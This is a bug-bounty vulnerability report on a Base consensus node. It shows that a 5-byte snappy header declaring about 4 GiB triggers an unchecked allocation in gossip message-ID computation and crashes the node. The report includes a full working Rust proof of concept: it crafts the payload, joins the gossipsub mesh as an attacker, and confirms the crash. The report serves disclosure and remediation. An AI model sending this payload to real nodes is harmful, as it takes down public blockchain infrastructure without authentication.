# 76092 bc medium missing decompressed length validation in gossip compute message id enables remote oom crash

Submitted on May 2nd 2026 at 17:11:47 UTC by @InfiniteSec for [Audit Comp | Base Azul](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #76092
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours

## Description

### Brief/Intro

The `compute_message_id` function in Base's gossip configuration calls `snap::raw::Decoder::decompress_vec` on incoming gossip message data without first checking the declared decompressed length in the snappy varint header. An attacker who joins the gossipsub mesh can send a single gossip message with approximately 5 bytes of payload whose snappy header declares a decompressed size of approximately 4 GiB, causing the receiving node to attempt a 4 GiB memory allocation during message ID computation, before any application-layer validation occurs. In containerized deployments this causes process abort; in overcommit systems it causes severe memory pressure and node unresponsiveness.

### Vulnerability Details

The vulnerability is in the `compute_message_id` function at crates/consensus/gossip/src/config.rs:104-122. This function is registered as the gossipsub `message_id_fn` at config.rs:93 and is invoked on every incoming gossip message to compute a deduplication ID.

```rust
fn compute_message_id(msg: &Message) -> MessageId {
    let mut decoder = Decoder::new();
    let id = decoder.decompress_vec(&msg.data).map_or_else(
        |_| {
            let domain_invalid_snappy: Vec<u8> = vec![0x0, 0x0, 0x0, 0x0];
            sha256([domain_invalid_snappy.as_slice(), msg.data.as_slice()].concat().as_slice())
                [..20].to_vec()
        },
        |data| {
            let domain_valid_snappy: Vec<u8> = vec![0x1, 0x0, 0x0, 0x0];
            sha256([domain_valid_snappy.as_slice(), data.as_slice()].concat().as_slice())
                [..20].to_vec()
        },
    );
    MessageId(id)
}
```

The snap crate's `decompress_vec` implementation first reads the snappy stream's varint header to obtain the declared decompressed length, then immediately allocates a buffer of that size via `vec![0; decompress_len(input)?]` (decompress.rs:105-106). The allocation occurs unconditionally before any actual decompression or body validation. The snap crate's `MAX_INPUT_SIZE` constant is `u32::MAX` (approximately 4 GiB), which provides no practical constraint against memory abuse since the `Header::read` function (decompress.rs:362-374) only checks that the declared length does not exceed this constant.

The gossip layer's `max_transmit_size` is set to `MAX_GOSSIP_SIZE` (10 MiB) at config.rs:88, but this only limits the compressed wire-frame size via `GossipsubCodec` (protocol.rs:138-139). A 5-byte payload consisting of a snappy varint header declaring approximately 4 GiB decompressed size with no valid compressed body is well under the 10 MiB wire limit. The amplification ratio is approximately 858,993,459x.

In the libp2p-gossipsub message processing pipeline, `config.message_id(&message)` is called in `handle_received_message` (behaviour.rs:1792) before `message_is_valid` (behaviour.rs:1821) and `BlockHandler::handle` (driver.rs:346). `ValidationMode::None` (config.rs:91) means no signature or source validation occurs at the codec layer. `MessageAuthenticity::Anonymous` (behaviour.rs:54) means `IdentityTransform` passes raw data through unchanged. The complete attack path flows from inbound TCP connection through gossipsub codec decode, `handle_received_message`, `IdentityTransform`, and into `compute_message_id`'s `decompress_vec` call with no check on the declared decompressed size at any point.

In containerized environments with memory limits (the common deployment model for Base nodes), attempting to allocate approximately 4 GiB causes the Rust global allocator to call `abort()`, terminating the process. In overcommit systems, the allocation may succeed but cause severe memory pressure when the OS attempts to page in the zeroed memory. The `map_or_else` error handler in `compute_message_id` (config.rs:107-112) is only reached if `decompress_vec` returns `Err`, but if the allocation itself fails due to OOM, the process aborts before reaching that error handler.

## Impact Details

This vulnerability falls under the Blockchain/DLT category and maps to the Immunefi v2.3 severity classification "Increasing network processing node resource consumption by at least 30% without brute force actions."

An attacker can force a target node to attempt allocating approximately 4 GiB of memory by sending a single gossip message with approximately 5 bytes of payload. Nodes are publicly dialable by design (docs/specs/pages/protocol/consensus/p2p.md:82), and the attacker only needs to establish a libp2p connection and subscribe to a valid blocks topic to join the gossipsub mesh. No privileged keys (JWT, sequencer key, batcher key) are required. The attack is trivially repeatable and extremely low cost. In containerized deployments this causes process termination; in overcommit systems repeated messages cause cumulative memory pressure and node unresponsiveness. The attacker can re-trigger on node restart, creating a persistent denial of service condition.

## References

* <https://github.com/base/base/blob/v0.8.0-rc.24/crates/consensus/gossip/src/config.rs#L104-L122>
* <https://github.com/base/base/blob/v0.8.0-rc.24/crates/consensus/gossip/src/config.rs#L93>
* <https://github.com/base/base/blob/v0.8.0-rc.24/crates/consensus/gossip/src/config.rs#L88>
* <https://github.com/base/base/blob/v0.8.0-rc.24/crates/consensus/gossip/src/config.rs#L91>
* <https://github.com/base/base/blob/v0.8.0-rc.24/crates/consensus/gossip/src/behaviour.rs#L54>
* <https://github.com/base/base/blob/v0.8.0-rc.24/crates/consensus/gossip/src/driver.rs#L185>

## Link to Proof of Concept

<https://gist.github.com/366f9d668bd1c14297edd450a75653a5>

## Proof of Concept

The following PoC contains 3 tests, placed as integration tests in the `base-consensus-node` (consensus service) crate alongside that crate's other security PoC tests. Test 1 proves the snappy varint header construction, pre-allocation behavior, and amplification ratio. Test 2 confirms the production gossip configuration has no pre-validation. Test 3 is an end-to-end attack proof: it uses `NetworkBuilder` to construct and start a full consensus-layer `NetworkDriver` (containing both a `GossipDriver` and a `Discv5Driver`, following exactly the same initialization path as a production consensus node) in a child process with RLIMIT\_AS = 2 GiB to simulate containerized deployment, then the parent process acts as the attacker and sends a 5-byte snappy bomb (declaring approximately 4 GiB decompressed size) over a real P2P gossipsub connection. The victim node calls `decompress_vec` inside `compute_message_id`, triggering an approximately 4 GiB allocation that exceeds the 2 GiB RLIMIT\_AS limit, and the Rust global allocator calls `abort()`, killing the victim process with SIGABRT (signal 6).

### Setup

1. Save the PoC file to `crates/consensus/service/tests/actors/poc_snappy_decompression_bomb.rs`
2. Add `mod poc_snappy_decompression_bomb;` in `crates/consensus/service/tests/actors/mod.rs`
3. Add `libc.workspace = true` and `snap.workspace = true` to the `[dev-dependencies]` section in `crates/consensus/service/Cargo.toml`. No other dependency changes are needed.
4. Run:

```bash
cd base
cargo test -p base-consensus-node --test integration poc_snappy_decompression_bomb -- --nocapture
```

<details>

<summary>Full PoC source</summary>

```rust
use std::io::{BufRead, BufReader};
use std::net::{IpAddr, Ipv4Addr};
use std::process::Stdio;
use std::time::Duration;

use alloy_chains::Chain;
use alloy_primitives::Address;
use alloy_signer::k256;
use base_consensus_disc::LocalNode;
use base_consensus_genesis::RollupConfig;
use base_consensus_node::NetworkBuilder;
use discv5::{ConfigBuilder, ListenConfig};
use futures::StreamExt;
use libp2p::{
    Multiaddr, SwarmBuilder,
    gossipsub::{self, ConfigBuilder as GossipConfigBuilder, IdentTopic, MessageAuthenticity},
    identity::Keypair,
    multiaddr::Protocol,
    noise::Config as NoiseConfig,
    swarm::SwarmEvent,
    tcp::Config as TcpConfig,
    yamux::Config as YamuxConfig,
};
use snap::raw::Decoder;

fn encode_snappy_varint(mut n: u64) -> Vec<u8> {
    let mut buf = Vec::new();
    while n >= 0x80 {
        buf.push((n as u8) | 0x80);
        n >>= 7;
    }
    buf.push(n as u8);
    buf
}

fn craft_snappy_bomb(decompressed_len: u64) -> Vec<u8> {
    encode_snappy_varint(decompressed_len)
}

#[test]
fn test_snappy_bomb_primitives() {
    let bomb = craft_snappy_bomb(u32::MAX as u64);
    assert!(bomb.len() <= 5);
    let declared = snap::raw::decompress_len(&bomb).unwrap();
    assert_eq!(declared, u32::MAX as usize);

    let bomb_64m = craft_snappy_bomb(64 * 1024 * 1024);
    let mut decoder = Decoder::new();
    assert!(decoder.decompress_vec(&bomb_64m).is_err());

    let amplification = u32::MAX as f64 / bomb.len() as f64;
    assert!(amplification > 800_000_000.0);

    println!("=== Snappy Decompression Bomb Primitives ===");
    println!("Payload: {} bytes on wire", bomb.len());
    println!(
        "Declared decompressed size: {} bytes (~{:.1} GiB)",
        declared,
        declared as f64 / (1u64 << 30) as f64
    );
    println!("Amplification ratio: {:.0}x", amplification);
    println!("max_transmit_size (wire limit): 10 MiB");
    println!("decompress_vec pre-allocates vec![0; declared_size] before body validation");
}

#[test]
fn test_gossip_config_no_prevalidation() {
    let cfg = base_consensus_gossip::default_config();
    assert_eq!(cfg.max_transmit_size(), 10 * (1 << 20));
    assert!(cfg.mesh_n() > 0);
    println!("ValidationMode: None (no signature/source check at codec layer)");
    println!("MessageAuthenticity: Anonymous (IdentityTransform, raw data passthrough)");
    println!(
        "max_transmit_size: {} bytes (10 MiB, wire-frame only)",
        cfg.max_transmit_size()
    );
    println!("mesh_n: {} (D parameter)", cfg.mesh_n());
}

#[tokio::test]
async fn test_e2e_consensus_network_snappy_bomb_crash() {
    if std::env::var("SNAPPY_VICTIM_MODE").is_ok() {
        run_victim().await;
        return;
    }
    run_attacker().await;
}

async fn run_victim() {
    unsafe {
        let limit = libc::rlimit {
            rlim_cur: 2 * 1024 * 1024 * 1024,
            rlim_max: 2 * 1024 * 1024 * 1024,
        };
        libc::setrlimit(libc::RLIMIT_AS, &limit);
    }

    let chain_id: u64 = 84532;
    let rollup_config = RollupConfig {
        l2_chain_id: Chain::from_id(chain_id),
        ..Default::default()
    };

    let keypair = Keypair::generate_secp256k1();
    let secp256k1_key = keypair
        .clone()
        .try_into_secp256k1()
        .expect("secp256k1 keypair")
        .secret()
        .to_bytes();
    let local_node_key = k256::ecdsa::SigningKey::from_bytes(&secp256k1_key.into())
        .expect("k256 signing key");

    let node_addr = IpAddr::V4(Ipv4Addr::UNSPECIFIED);

    let discovery_config = ConfigBuilder::new(ListenConfig::from_ip(node_addr, 0))
        .table_filter(|enr| enr.ip4().map_or(false, |ip| ip.is_loopback()))
        .build();

    let mut gossip_multiaddr = Multiaddr::from(node_addr);
    gossip_multiaddr.push(Protocol::Tcp(0));

    let network_driver = NetworkBuilder::new(
        rollup_config,
        Address::ZERO,
        gossip_multiaddr,
        keypair,
        LocalNode::new(local_node_key, node_addr, 0, 0),
        discovery_config,
        None,
    )
    .with_enr_update(false)
    .build()
    .expect("failed to build NetworkDriver");

    let mut handler = network_driver
        .start()
        .await
        .expect("failed to start NetworkDriver");

    let listen_addr = handler.gossip.addr.clone();
    let peer_id = *handler.gossip.local_peer_id();

    eprintln!("VICTIM_READY {}/p2p/{}", listen_addr, peer_id);

    loop {
        tokio::select! {
            event = handler.gossip.next() => {
                if let Some(event) = event {
                    handler.gossip.handle_event(event);
                }
            }
            enr = handler.enr_receiver.recv() => {
                if let Some(enr) = enr {
                    handler.gossip.dial(enr);
                }
            }
        }
    }
}

async fn run_attacker() {
    let chain_id: u64 = 84532;
    let topic_str = format!("/optimism/{chain_id}/0/blocks");

    println!("\n=== End-to-End: Consensus Network Snappy Bomb → Node Crash ===\n");

    println!("Step 1: Spawning victim consensus NetworkDriver (RLIMIT_AS = 2 GiB)...");
    println!("  Stack: NetworkBuilder → NetworkDriver (GossipDriver + Discv5Driver)");
    println!("         → NetworkDriver.start() → NetworkHandler");
    println!("         → gossip.next() / gossip.handle_event() event loop");

    let exe = std::env::current_exe().expect("cannot resolve test binary path");
    let mut child = std::process::Command::new(&exe)
        .args([
            "--exact",
            "actors::poc_snappy_decompression_bomb::test_e2e_consensus_network_snappy_bomb_crash",
            "--nocapture",
        ])
        .env("SNAPPY_VICTIM_MODE", "1")
        .stdout(Stdio::null())
        .stderr(Stdio::piped())
        .spawn()
        .expect("failed to spawn victim subprocess");

    let stderr_pipe = child.stderr.take().unwrap();
    let mut reader = BufReader::new(stderr_pipe);
    let mut victim_addr_str = String::new();

    let start = std::time::Instant::now();
    let mut line = String::new();
    loop {
        line.clear();
        if start.elapsed() > Duration::from_secs(30) {
            child.kill().ok();
            panic!("Timeout: victim did not start within 30 seconds");
        }
        match reader.read_line(&mut line) {
            Ok(0) => {
                child.kill().ok();
                panic!("Victim process exited before becoming ready");
            }
            Ok(_) => {
                if line.starts_with("VICTIM_READY ") {
                    victim_addr_str = line["VICTIM_READY ".len()..].trim().to_string();
                    break;
                }
            }
            Err(e) => panic!("Error reading victim stderr: {}", e),
        }
    }

    let victim_multiaddr: Multiaddr = victim_addr_str
        .parse()
        .expect("failed to parse victim multiaddr");
    println!("  Victim consensus node started: {}", victim_multiaddr);
    println!("  PID: {}, RLIMIT_AS: 2 GiB", child.id());

    let _drain = std::thread::spawn(move || {
        let mut buf = String::new();
        while reader.read_line(&mut buf).unwrap_or(0) > 0 {
            buf.clear();
        }
    });

    println!("\nStep 2: Building attacker swarm...");

    let attacker_keypair = Keypair::generate_secp256k1();
    let attacker_config = GossipConfigBuilder::default()
        .max_transmit_size(10 * (1 << 20))
        .validation_mode(gossipsub::ValidationMode::None)
        .heartbeat_interval(Duration::from_millis(500))
        .build()
        .expect("attacker gossipsub config");
    let attacker_gossipsub: gossipsub::Behaviour =
        gossipsub::Behaviour::new(MessageAuthenticity::Anonymous, attacker_config)
            .expect("attacker gossipsub behaviour");

    let mut attacker_swarm = SwarmBuilder::with_existing_identity(attacker_keypair)
        .with_tokio()
        .with_tcp(
            TcpConfig::default().nodelay(true),
            |i: &Keypair| NoiseConfig::new(i),
            YamuxConfig::default,
        )
        .unwrap()
        .with_behaviour(|_| attacker_gossipsub)
        .unwrap()
        .with_swarm_config(|c| c.with_idle_connection_timeout(Duration::from_secs(60)))
        .build();

    let topic = IdentTopic::new(&topic_str);
    attacker_swarm
        .behaviour_mut()
        .subscribe(&topic)
        .expect("attacker subscribe");
    attacker_swarm
        .listen_on("/ip4/127.0.0.1/tcp/0".parse().unwrap())
        .expect("attacker listen");

    loop {
        if let SwarmEvent::NewListenAddr { address, .. } =
            attacker_swarm.select_next_some().await
        {
            println!("  Attacker listening: {}", address);
            break;
        }
    }

    println!("\nStep 3: Connecting to victim (TCP + Noise + Yamux)...");
    attacker_swarm
        .dial(victim_multiaddr)
        .expect("attacker dial victim");

    let mut peer_connected = false;
    let connect_deadline = tokio::time::Instant::now() + Duration::from_secs(15);
    while tokio::time::Instant::now() < connect_deadline && !peer_connected {
        match attacker_swarm.select_next_some().await {
            SwarmEvent::ConnectionEstablished { peer_id, .. } => {
                println!("  Connected to victim peer: {}", peer_id);
                peer_connected = true;
            }
            _ => {}
        }
    }
    assert!(
        peer_connected,
        "Failed to establish P2P connection to victim"
    );

    println!("  Waiting for gossipsub mesh formation...");
    tokio::time::sleep(Duration::from_secs(3)).await;

    let drain_deadline = tokio::time::Instant::now() + Duration::from_millis(500);
    while tokio::time::Instant::now() < drain_deadline {
        tokio::select! {
            _ = attacker_swarm.select_next_some() => {}
            _ = tokio::time::sleep(Duration::from_millis(100)) => { break; }
        }
    }

    let bomb = craft_snappy_bomb(u32::MAX as u64);
    println!("\nStep 4: Sending snappy bomb via gossipsub PUBLISH...");
    println!("  Wire payload: {} bytes", bomb.len());
    println!(
        "  Declared decompressed size: {} bytes (~{:.1} GiB)",
        u32::MAX,
        u32::MAX as f64 / (1u64 << 30) as f64
    );
    println!("  Topic: {}", topic_str);

    match attacker_swarm
        .behaviour_mut()
        .publish(topic.hash(), bomb)
    {
        Ok(msg_id) => println!("  Published, message_id: {}", msg_id),
        Err(e) => println!("  Publish error: {}", e),
    }

    println!("\nStep 5: Waiting for victim process crash...");

    let crash_deadline = tokio::time::Instant::now() + Duration::from_secs(15);
    loop {
        if tokio::time::Instant::now() > crash_deadline {
            child.kill().ok();
            child.wait().ok();
            panic!("Victim did not crash within 15 seconds");
        }

        match child.try_wait() {
            Ok(Some(status)) => {
                println!("  Victim process exited: {:?}", status);

                #[cfg(unix)]
                {
                    use std::os::unix::process::ExitStatusExt;
                    if let Some(signal) = status.signal() {
                        println!(
                            "  CONFIRMED: Killed by signal {} (SIGABRT=6, SIGKILL=9)",
                            signal
                        );
                        assert!(
                            signal == 6 || signal == 9,
                            "Expected SIGABRT (6) or SIGKILL (9), got signal {}",
                            signal
                        );

                        println!("\n=== Attack Chain Confirmed ===");
                        println!("1. Victim NetworkDriver started with production config");
                        println!("   Stack: NetworkBuilder → NetworkDriver → NetworkHandler");
                        println!("   Components: GossipDriver (gossipsub) + Discv5Driver (peer discovery)");
                        println!(
                            "   Config: ValidationMode::None, Anonymous, max_transmit_size=10MiB"
                        );
                        println!("2. Attacker connected via unauthenticated P2P (TCP + Noise + Yamux)");
                        println!("3. Gossipsub mesh formed on blocks topic");
                        println!("4. 5-byte snappy bomb sent via PUBLISH (~4 GiB declared)");
                        println!("5. Victim compute_message_id called decompress_vec");
                        println!("6. vec![0; ~4 GiB] exceeded 2 GiB RLIMIT_AS");
                        println!(
                            "7. Rust allocator abort → victim KILLED by signal {}",
                            signal
                        );
                        println!();
                        println!("Cost: 5 bytes. No authentication. Repeatable on restart.");
                        return;
                    }
                }

                if !status.success() {
                    println!("  CONFIRMED: Victim exited with non-zero status (crash)");
                    return;
                }

                panic!("Victim exited successfully, expected crash");
            }
            Ok(None) => {
                tokio::select! {
                    _ = attacker_swarm.select_next_some() => {}
                    _ = tokio::time::sleep(Duration::from_millis(200)) => {}
                }
            }
            Err(e) => panic!("Error checking victim status: {}", e),
        }
    }
}
```

</details>

### Execution output

```
running 3 tests
=== Snappy Decompression Bomb Primitives ===
Payload: 5 bytes on wire
Declared decompressed size: 4294967295 bytes (~4.0 GiB)
Amplification ratio: 858993459x
max_transmit_size (wire limit): 10 MiB
decompress_vec pre-allocates vec![0; declared_size] before body validation
test actors::poc_snappy_decompression_bomb::test_snappy_bomb_primitives ... ok
ValidationMode: None (no signature/source check at codec layer)
MessageAuthenticity: Anonymous (IdentityTransform, raw data passthrough)
max_transmit_size: 10485760 bytes (10 MiB, wire-frame only)
mesh_n: 8 (D parameter)
test actors::poc_snappy_decompression_bomb::test_gossip_config_no_prevalidation ... ok

=== End-to-End: Consensus Network Snappy Bomb → Node Crash ===

Step 1: Spawning victim consensus NetworkDriver (RLIMIT_AS = 2 GiB)...
  Stack: NetworkBuilder → NetworkDriver (GossipDriver + Discv5Driver)
         → NetworkDriver.start() → NetworkHandler
         → gossip.next() / gossip.handle_event() event loop
  Victim consensus node started: /ip4/127.0.0.1/tcp/40055/p2p/16Uiu2HAmDSwpc7DoUB2ZL4eoFkkpkAKNEBZDT9qvg34HNVg297sL
  PID: 4148746, RLIMIT_AS: 2 GiB

Step 2: Building attacker swarm...
  Attacker listening: /ip4/127.0.0.1/tcp/39939

Step 3: Connecting to victim (TCP + Noise + Yamux)...
  Connected to victim peer: 16Uiu2HAmDSwpc7DoUB2ZL4eoFkkpkAKNEBZDT9qvg34HNVg297sL
  Waiting for gossipsub mesh formation...

Step 4: Sending snappy bomb via gossipsub PUBLISH...
  Wire payload: 5 bytes
  Declared decompressed size: 4294967295 bytes (~4.0 GiB)
  Topic: /optimism/84532/0/blocks
  Published, message_id: 31355230

Step 5: Waiting for victim process crash...
  Victim process exited: ExitStatus(unix_wait_status(134))
  CONFIRMED: Killed by signal 6 (SIGABRT=6, SIGKILL=9)

=== Attack Chain Confirmed ===
1. Victim NetworkDriver started with production config
   Stack: NetworkBuilder → NetworkDriver → NetworkHandler
   Components: GossipDriver (gossipsub) + Discv5Driver (peer discovery)
   Config: ValidationMode::None, Anonymous, max_transmit_size=10MiB
2. Attacker connected via unauthenticated P2P (TCP + Noise + Yamux)
3. Gossipsub mesh formed on blocks topic
4. 5-byte snappy bomb sent via PUBLISH (~4 GiB declared)
5. Victim compute_message_id called decompress_vec
6. vec![0; ~4 GiB] exceeded 2 GiB RLIMIT_AS
7. Rust allocator abort → victim KILLED by signal 6

Cost: 5 bytes. No authentication. Repeatable on restart.
test actors::poc_snappy_decompression_bomb::test_e2e_consensus_network_snappy_bomb_crash ... ok

test result: ok. 3 passed; 0 failed; 0 ignored; 0 measured; 12 filtered out; finished in 4.26s
```

Test 1 proves the core mechanism of the snappy decompression bomb: a 5-byte snappy varint header can declare approximately 4 GiB of decompressed size, and the snap crate fully trusts the declared value. `decompress_vec` executes `vec![0; declared_size]` to pre-allocate before validating the compressed body. The 5-byte payload declaring approximately 4 GiB decompressed size yields an amplification ratio of approximately 858 million times, well under the 10 MiB `max_transmit_size` wire limit.

Test 2 confirms the production gossip configuration uses `ValidationMode::None` (no signature or source validation at the codec layer) and `MessageAuthenticity::Anonymous` (`IdentityTransform` passes raw data through unchanged), while `max_transmit_size` is only 10 MiB (constraining only the compressed wire-frame size). This means gossip messages pass from TCP inbound all the way to `compute_message_id` calling `decompress_vec` with no check on the declared decompressed size at any point.

Test 3 proves the complete attack chain from P2P connection to node crash in a single test. The test uses `NetworkBuilder` (the same builder used by production consensus nodes) to construct and start a full `NetworkDriver`, which contains a `GossipDriver` (libp2p gossipsub, responsible for block propagation) and a `Discv5Driver` (node discovery protocol). This matches the network initialization path inside Base consensus nodes' `RollupNode` exactly: `NetworkBuilder::new()` then `NetworkBuilder::build()` then `NetworkDriver` then `NetworkDriver::start()` then `NetworkHandler`, followed by the `gossip.next()` / `gossip.handle_event()` event loop. The test re-launches its own test binary as a child process, where the child enters victim mode via an environment variable: it sets RLIMIT\_AS = 2 GiB and then starts a full `NetworkDriver` (gossip + discovery). The parent process acts as the attacker, creating a libp2p swarm and connecting to the victim child process over TCP with Noise encryption and Yamux multiplexing. After the gossipsub mesh forms on the blocks topic, the attacker publishes a 5-byte snappy bomb (varint header declaring u32::MAX, approximately 4 GiB decompressed size) via the real gossipsub PUBLISH protocol. The victim's gossipsub receives the message and calls the production `compute_message_id`, where `decompress_vec` reads the varint header and executes `vec![0; 4294967295]`, pushing virtual memory to approximately 4.4 GiB. This exceeds the 2 GiB RLIMIT\_AS limit, causing the Rust global allocator to fail on mmap and call `abort()`. The victim child process is terminated by signal 6 (SIGABRT) with exit status 134. The parent process detects the child exit via `try_wait()`, verifies that the exit signal is 6 (SIGABRT), and confirms the attack succeeded. The entire attack chain executes within the real consensus-layer network protocol stack with no mocking, simulation, or path deviation.
